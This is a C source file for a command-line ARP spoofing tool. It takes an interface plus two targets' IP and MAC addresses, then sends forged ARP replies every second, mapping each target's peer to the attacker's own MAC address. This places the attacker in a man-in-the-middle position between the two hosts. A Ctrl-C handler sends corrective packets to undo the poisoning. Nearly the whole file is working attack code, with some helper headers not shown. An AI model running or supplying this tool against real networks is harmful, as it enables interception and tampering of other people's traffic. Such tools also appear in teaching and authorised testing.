#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/if_ether.h>

#include <signal.h>

#include "utils.h"
#include "arp.h"
#include "packet.h"

#define SLEEP_DELAY 1

int s; // socket
struct sockaddr_ll sa;
struct arp_packet packet1_cl; // unpoisoning arp packet1
struct arp_packet packet2_cl; // unpoisoning arp packet2

/* send packet p and write message to standard output */
void
sendpacket(struct arp_packet * p)
{
    char s_hwa_str[18];
    char s_ipa_str[16];
    char t_hwa_str[18];
    char t_ipa_str[16];

    // get string representation of adresses
    hwa_tostr(s_hwa_str, p->sender_hwa);
    ipa_tostr(s_ipa_str, p->sender_ipa);
    hwa_tostr(t_hwa_str, p->target_hwa);
    ipa_tostr(t_ipa_str, p->target_ipa);

    // print and send
    printf("ARP reply to %s (%s): %s is at %s\n", t_ipa_str, t_hwa_str, s_ipa_str, s_hwa_str);
    sendto(s, p, sizeof(struct arp_packet), 0, (struct sockaddr *) &sa, SOCKADDR_SIZE);
}

/* 
 * this method triggers on SIGINT and
 * sends 5 unpoisoning packets for both
 * targets, close socket and exit program
 */
void
cleanup()
{
  p("Cleaning up and unpoisoning targets");
  int i = 0;
  for(; i < 5; ++i) {
    sendpacket(&packet1_cl);
    sendpacket(&packet2_cl);
    sleep(SLEEP_DELAY);
  }

  close(s);
  exit(0);
}

void
showusage()
{
  p("Usage: ./arpspoof <interface> <target1-ip> <target1-mac> <target2-ip> <target2-mac> ");
  exit(1);
}

int
main(int argc, char ** argv)
{

  uint8_t ipa1[4];
  uint8_t hwa1[6];
  uint8_t ipa2[4];
  uint8_t hwa2[6];
  uint8_t hwa_host[6];

  char * if_name;
  char * ipa1_str;
  char * hwa1_str;
  char * ipa2_str;
  char * hwa2_str;

  if (argc < 6)
    showusage();

  // save params
  if_name = argv[1];
  ipa1_str = argv[2];
  hwa1_str = argv[3];
  ipa2_str = argv[4];
  hwa2_str = argv[5];

  // parse target and host addresses
  parse_ipa(ipa1, ipa1_str);
  parse_hwa(hwa1, hwa1_str);
  parse_ipa(ipa2, ipa2_str);
  parse_hwa(hwa2, hwa2_str);

  gethwaddr(hwa_host, if_name);

  // create arp packet
  struct arp_packet packet1 = create_arp_packet(ipa1, hwa1, ipa2, hwa_host);
  struct arp_packet packet2 = create_arp_packet(ipa2, hwa2, ipa1, hwa_host);
  packet1_cl = create_arp_packet(ipa1, hwa1, ipa2, hwa2);
  packet2_cl = create_arp_packet(ipa2, hwa2, ipa1, hwa1);

  // get sockaddr
  sa = getsockaddr(if_name, hwa_host); // HACK hwa_host? target_hwa maybe

  // initialize socket
  s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

  if (s < 0){
    perror("socket");
    exit(1);
  }

  // some other stuff
  signal(SIGINT, cleanup);

  // start sending packets
  p("Poisoning targets with ARP packets");
  while (1) {
    sendpacket(&packet1);
    sendpacket(&packet2);
    sleep(SLEEP_DELAY);
  }

  return 0;
}




